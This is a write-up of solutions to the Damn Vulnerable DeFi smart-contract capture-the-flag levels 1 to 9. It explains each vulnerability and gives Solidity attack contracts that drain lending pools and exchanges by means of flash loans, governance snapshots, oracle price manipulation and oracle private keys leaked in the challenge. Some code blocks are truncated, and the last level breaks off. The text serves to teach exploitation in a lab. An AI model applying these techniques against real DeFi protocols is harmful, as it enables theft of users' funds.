## 01 Unstoppable

To beat this level, we need to comply with

```solidity
vm.startPrank(someUser);

vm.expectRevert();
receiverContract.executeFlashLoan(100e18);

vm.stopPrank();
```

That is, prevent `someUser` to perform a Flash Loan. In other words, a Denial of Service on the Vault.

NOTE: This user already created an instance of the `ReceiverUnstoppable` contract at the setup.

### Solution

#### Notes on `UnstoppableVault`

* `UnstoppableVault` is an [ERC-4626](https://eips.ethereum.org/EIPS/eip-4626) Tokenized Vault, implementing a Flash Loan by [ERC-3156](https://eips.ethereum.org/EIPS/eip-3156).
* Its underlying token is `DVT`, its shares are the `oDVT` token.
* The flash loan lends `DVT`.

#### Notes on the `totalAssets()` implementation

While this analysis doesn't add to the solution, it is worth looking at the assembly code at `totalAssets()`:

```solidity
assembly { // better safe than sorry
    if eq(sload(0), 2) {
        mstore(0x00, 0xed3ba6a6)
        revert(0x1c, 0x04)
    }
}
```

Is a reentrancy control.

* `UnstoppableVault` inherits from `IERC3156FlashLender`, `ReentrancyGuard`, `Owned`, and `ERC4626`.
* While `IERC3156FlashLender` does not have any variable, `ReentrancyGuard` has `uint256 private locked = 1`, therefore, slot 0 will be the value of `locked`, unless the modifier `nonReentrant()` is used.
* This function performs an additional check over this value:
  * It loads slot 0, and compares its value with `2`
  * If slot 0 is equal 2, then it will store in memory position `0x00` the `Reentrant()` function selector `0xed3ba6a6`
  * Then it will revert, with the value `0xed3ba6a6`.
  * To explain why `revert()` uses the `0x1c`, look at the 32 bytes of memory from position `0x00`:
    * `0x00000000000000000000000000000000000000000000000000000000ed3ba6a6`
    * There, it can be noticed that the value starts at position `0x1c`.

#### Notes on `UnstoppableVault.flashLoan()`

Notice the following guard:

```solidity
uint256 balanceBefore = totalAssets();
if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // enforce ERC4626 requirement
```

`convertToShares` will take the given **assets** (underlying token) and compute the amount of **shares**.

As it can be seen that `balanceBefore` is a measure of the **assets** in the vault, then there is a problem of units we can leverage.

#### Leveraging the implementation error

Since `(convertToShares(totalSupply)` is `total shares * (total shares / total assets)`, and this quantity has to be equal to `total assets` (`balanceBefore`), it follows that if we manage to make the total of shares different to the total of assets, we would make the guard fail, preventing flash loans to work.

How do we pertub this ratio? We cannot mint or burn shares without `deposit` or `withdraw`. What we can do instead is incrementing the amount of the underlying asset (`DVT`) in the vault, with a simple `transfer()`.

```solidity
token.transfer(address(level.vault()), 1);
```

By transfering a single `DVT` token, the values checked at the guard will be different, breaking the flash loan.

## 02 Naive Receiver

To beat this level, we need to comply with

```solidity
assertEq(address(receiver).balance, 0);
assertEq(address(pool).balance, ETHER_IN_POOL + ETHER_IN_RECEIVER);
```

In other words: Drain the receiver, putting its funds in the pool.

### Solution

The fees of the pool are notably high

```solidiy
uint256 private constant FIXED_FEE = 1 ether; // not the cheapest flash loan
```

And the `flashLoan()` function doesn't control for the caller

```solidity
function flashLoan(
    IERC3156FlashBorrower receiver,
    address token,
    uint256 amount,
    bytes calldata data
) external returns (bool) {
    if (token != ETH)
        revert UnsupportedCurrency();

    uint256 balanceBefore = address(this).balance;

    // Transfer ETH and handle control to receiver
    SafeTransferLib.safeTransferETH(address(receiver), amount);
    if(receiver.onFlashLoan(
        msg.sender,
        ETH,
// ....
```

Let's just borrow on behalf of the receiver, then ðŸ˜ˆ

```solidity
IPool pool = IPool(address(level.pool()));
address receiverAddr = address(level.receiver());

for (uint8 i = 0; i < 10; i++) {
  pool.flashLoan(receiverAddr, level.pool().ETH(), address(pool).balance, "0x");
}
```

## 03 Truster

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
assertEq(token.balanceOf(address(pool)), 0);
```

### Solution

Notice that `TrusterLenderPool.flashLoan` executes any function at _any target_ for you

```solidity
target.functionCall(data);
```

We set an approval to receive all the tokens after we perform a flash loan then

```solidity
// tell the pool in the custom function to approve a transfer to us
bytes memory data = abi.encodeWithSelector(IERC20.approve.selector, address(this), TOKENS_IN_POOL);
```

One question during the analysis of this problem was "_But then, how do we give the funds back to the loan, while we plant the approval?_". Fortunately,

1. the pool doesn't control for loans of `0` tokens nor charge fees, so we don't need to equip a mechanism to give funds back.
2. ERC20's `transfer` doesn't fail when the `amount` is 0.

We issue the flash loan of 0, and then take the funds.

```solidity
// the pool doesn't control for a loan of 0 tokens, nor charges a fee.
// hence, we don't need to prepare a callback to give it funds back.
pool.flashLoan(
  0,
  address(this),
  address(token),
  data
);

// with our approval planted, we just take the funds
token.transferFrom(address(pool), address(this), TOKENS_IN_POOL);
```

## 04 Side Entrance

To beat this level, we need to comply with

```solidity
// did we drain the pool?
assertEq(msg.sender.balance, PLAYER_INITIAL_ETH_BALANCE + ETHER_IN_POOL);
assertEq(address(pool).balance, 0);
```

### Solution

If we make a flash loan, and `deposit()` the funds two things happen:

1. We comply with `(address(this).balance < balanceBefore)`, so the flash loan won't revert.
2. At `deposit()`, This `balances[msg.sender] += msg.value` will execute.

As `withdraw()` only checks the `balances[]` mapping, we will get the amount recorded there.

The solution then is

```solidity
function attack() external {
  // we borrow the funds, the flashLoan() function will
  // call execute() and we deposit() these funds in there,
  // incrementing our balance in the pool.
  pool.flashLoan(1_000 ether);

  // as withdraw() only checks the balances[] mapping,
  // we will get the amount recorded there.
  pool.withdraw();

  // pass the funds to the player
  (bool success,) = msg.sender.call{value: 1_000 ether}("");
  success;
}

function execute() external payable {
  pool.deposit{value: msg.value}();
}
```

Implement `receive() external payable {}` in your contracts.

## 05 The Rewarder

To beat this level, we need to comply with

```solidity
// Users should get neglegible rewards this round
// ...

// Rewards must have been issued to the player account
// ...

// The amount of rewards earned should be close to total available amount
// ...

// Balance of DVT tokens in player and lending pool hasn't changed
// ...
```

Also, this happens at round 3: `assertEq(rewarderPool.roundNumber(), 3)`.

### Solution

Round number will change at `_recordSnapshot()` (provided the 5 days have passed from last round), and this function only gets triggered at the constructor and `distributeRewards()`.

We can leverage a flash loan of the accounting token to get all the funds we can, deposit them into the pool, trigger `distributeRewards()` to increase the round number, and withdrawing the funds after we get the reward.

```solidity
function attack() public {
  // borrow all the DVT you can get
  // the flow continues at receiveFlashLoan()
  flashLoanPool.flashLoan(liquidityToken.balanceOf(address(flashLoanPool)));

  // give the reward to the player, to beat the level
  rewardToken.transfer(msg.sender, rewardToken.balanceOf(address(this)));
}

function receiveFlashLoan(uint256 amount) public {
  // deposit the DVT into the rewarderPool
  liquidityToken.approve(address(rewarderPool), amount);
  rewarderPool.deposit(amount);

  // trigger this to get rewards, and increment the round number
  rewarderPool.distributeRewards();

  // got the rewards, get the DVT back
  rewarderPool.withdraw(amount);

  // pay back the flash loan
  liquidityToken.transfer(msg.sender, amount);
}
```

## 06 Selfie

To beat this level, we need to comply with

```solidity
assertEq(token.balanceOf(msg.sender), TOKENS_IN_POOL);
assertEq(token.balanceOf(address(pool)), 0);
```

In other words: Drain the pool, get all the funds.

### Solution

* The function `emergencyExit()` can drain the pool, but has the `onlyGovernance` modifier.

* The `onlyGovernance` modifier controls that only the `SimpleGovernance` contract executes this function.
  * We can add this function at `queueAction()` so `executeAction()` will invoke it.

* Now, `queueAction()` asks you to have enough votes (`hasEnoughVotes(msg.sender)`).
  * To have the votes, you need to have enough of the contract's `_governanceToken`, which is the same `token` of the pool. That is, we can just take a flash loan, issue a `snapshot()`, and get the majority of votes.
  * After we run the `snapshot()`, we can deliver the payload.

* Because `executeAction()` will ask for a minimum `ACTION_DELAY_IN_SECONDS` of `2 days`, we would have to wait IRL for that time to execute the attack. We just pretend we do with `vm.warp(block.timestamp + 2 days)`. Also we would get the `actionId` by inspecting the `ActionQueued` event log.

Putting everything together, we have

```solidity
function onFlashLoan(
      address,
      address,
      uint256 amount,
      uint256,
      bytes calldata
  ) external returns (bytes32) {
  // since this implements DamnValuableTokenSnapshot,
  // we can just issue a snapshot.
  // as we were able to borrow the maximum of the pool,
  // we will get the majority of the votes.
  governanceToken.snapshot();

  // prepare the payload
  bytes memory data = abi.encodeWithSelector(
    ISelfiePool.emergencyExit.selector,
    player
  );

  // deliver the payload
  governance.queueAction(
    address(pool),
    0,
    data
  );

  // return the funds
  token.approve(msg.sender, amount);
  return keccak256("ERC3156FlashBorrower.onFlashLoan");
}

// .... wait for 2 days ....
// then:

function attack() public {
  // IRL we would obtain this id parameter by inspecting
  // the log of the ActionQueued event.
  governance.executeAction(1);
}
```

## 07 Compromised

To beat this level, we need to comply with

```solidity
// drain the exchange
assertEq(address(exchange).balance, 0);
assertGt(msg.sender.balance, EXCHANGE_INITIAL_ETH_BALANCE);

// player doesn't own any NFT
assertEq(nftToken.balanceOf(msg.sender), 0);
// median price doesn't vary
assertEq(oracle.getMedianPrice("DVNFT"), INITIAL_NFT_PRICE);
```

### Solution

We can beat the level if we manage to sell an NFT to the exchange at 999 ETH. The problem being, how do we get one in the first place.

If we look at the set up of the oracle, we see that the sources are

```solidity
address[] memory sources = new address[](3);
sources[0] = 0xA73209FB1a42495120166736362A1DfA9F95A105;
sources[1] = 0xe92401A4d3af5E446d93D11EEc806b1462b39D15;
sources[2] = 0x81A5D6E50C214044bE44cA0CB057fe119097850c;
```

And, that at the definition of the level [at damnvulnerabledefi.xyz](https://www.damnvulnerabledefi.xyz/challenges/compromised/) we read

0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
```

We can verify that the private keys are the ones of two trusted sources:

```bash
cast wallet address --private-key 0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9
# 0xe92401A4d3af5E446d93D11EEc806b1462b39D15

cast wallet address --private-key 0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48
# 0x81A5D6E50C214044bE44cA0CB057fe119097850c

```

In other words, we can just `oracle.postPrice("DVNFT", 0);` for each of these sources, then being able to buy an NFT from the exchange for 1 wei.

Putting all together:

```solidity
function attack(Vm vm) public {
  // we got the private keys from the intercepted message
  // IRL we use a script with the given keys instead of `vm.startPrank()`
  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
  oracle.postPrice("DVNFT", 0);
  vm.stopPrank();

  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
  oracle.postPrice("DVNFT", 0);
  vm.stopPrank();

  // this function will call onERC721Received() below
  exchange.buyOne{value: 1 wei}();

  // returning to the price it was, so we can drain the exchange
  vm.startPrank(0xe92401A4d3af5E446d93D11EEc806b1462b39D15);
  oracle.postPrice("DVNFT", 999000000000000000000);
  vm.stopPrank();

  vm.startPrank(0x81A5D6E50C214044bE44cA0CB057fe119097850c);
  oracle.postPrice("DVNFT", 999000000000000000000);
  vm.stopPrank();

  // let's sell this token
  token.approve(address(exchange), tokenId);
  exchange.sellOne(tokenId);

  // give the money to the player to beat the level
  (bool success,) = msg.sender.call{value: address(this).balance}("");
  success;
}
```

## 08 Puppet

To beat this level, we need to comply with

```solidity
// In the challenge written in hardhat we checked that the
// attacker did everything in one single transaction.
// we omit this check in forge.

// player has taken all tokens from the pool
assertEq(token.balanceOf(address(lendingPool)), 0);
assertEq(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
```

In forge, save few exceptions, we do the attacks in a single transaction.

### Solution

We need to find a way to borrow cheap the 100_000 tokens, notice that the price used in the loan is computed with

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
    return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
}

function _computeOraclePrice() private view returns (uint256) {
    // calculates the price of the token in wei according to Uniswap pair
    return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
}
```

By decreasing the amount of ETH and decreasing the amount of DVT in the uniswap exchange, we can lower the oracle price. As we have 1_000 DVTs we can engage in a swap of DVT for ETH with `tokenToEthSwapInput()`. We will then, have the required amount of ETH to be able to borrow the DVT from the pool and beat the level.

```solidity
token.approve(address(uniswapExchange), 1000e18);
uniswapExchange.tokenToEthSwapInput(1000e18, 1, block.timestamp * 2);

lendingPool.borrow
  {value: lendingPool.calculateDepositRequired(100_000e18)}
    (100_000e18, address(this));
```

## 09 Puppet V2

To beat this level, we need to comply with

```solidity
// Player has taken all tokens from the pool
assertEq(token.balanceOf(address(lendingPool)), 0);
assertGe(token.balanceOf(msg.sender), POOL_INITIAL_TOKEN_BALANCE);
```

### Challenge Setup Notes

* Initially we added the libs of uniswap2 as dependencies, referenced using interfaces.
* But there was this problem when referencing created pairs: The function `pairFor()` at `UniswapV2Library.sol` uses a init code hash.
* Some initial investigation points that this happens due to be working on a testnet.

* Solution was just copy the library files we needed into the `puppet-v2` challenge's directory sources, and modify that line, computing the new init code hash from the function `UniswapV2Factory.createPair()`.

* Some reference links
  * https://github.com/Uniswap/v2-core/issues/102
  * https://ethereum.stackexchange.com/questions/88075/uniswap-addliquidity-function-transaction-revert

* Getting the new init code hash in place:

```solidity
pair = address(uint(keccak256(abi.encodePacked(
        hex'ff',
        factory,
        keccak256(abi.encodePacked(token0, token1)),
        // hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' // init code hash

        // new init code hash computed from
        //   keccak256(abi.encodePacked(bytecode))
        //   at the function UniswapV2Factory.createPair()
        // probably this happens since we are deploying to our testnet.
        // (needs more investigation!)
        hex'e091aae7c9eeedb6bff7e60c8e1a808d9cdc235f6b2e6e93284b02a4170f9361'
    ))));
```

### Solution

We need to lower the cost of the token, then use our ETH to borrow the whole pool.

Let's send all of the token we have been assigned at the challenge to the uniswap exchange

```solidity
token.approve(address(uniswapRouter), PLAYER_INITIAL_TOKEN_BALANCE);
address[] memory path = new address[](2);
path[0] = address(token);
path[1] = address(weth);
uniswapRouter.swapExactTokensForETH(PLAYER_INITIAL_TOKEN_BALANCE, 0, path, address(this), block.timestamp + 1);
```

We will receive ETH, so let's implement `receive()` at our attacking smart contract.

Next, just borrow using your initial amount plus the ETH you received. Notice that it is required to wrap the ETH and make it available for transfer.

```solidity
uint256 weth_required = lendingPool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE);
weth.deposit{value: weth_required}();
weth.approve(address(lendingPool), weth_required);
```
